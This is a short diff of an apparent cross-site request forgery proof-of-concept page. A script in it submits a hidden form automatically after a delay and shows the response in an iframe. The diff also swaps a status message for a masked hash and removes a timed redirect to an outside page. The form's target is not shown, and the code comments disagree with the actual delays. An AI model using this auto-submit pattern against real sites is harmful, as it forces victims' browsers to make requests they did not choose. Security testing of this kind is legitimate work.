@@ -49,18 +49,13 @@
   <!-- ✅ iframe：不隐藏，用于展示响应内容 -->
  <iframe name="resultFrame" width="100%" height="600px" style="border: 1px solid #ccc;"></iframe>
 
-  <p>⏳ 正在提交，请稍候…</p>
+  <p>哈希：90c789******11e346d</p>
 
   <script>
     // 提交表单：延迟 3 秒
     setTimeout(() => {
       document.getElementById('csrfForm').submit();
     }, 5000);
-
-    // 页面跳转：延迟 6 秒（确保 iframe 有时间加载响应）
-    setTimeout(() => {
-      window.location.href = "https://ad721.nb200.net/404.html";
-    }, 12000);
   </script>
 
 </body>
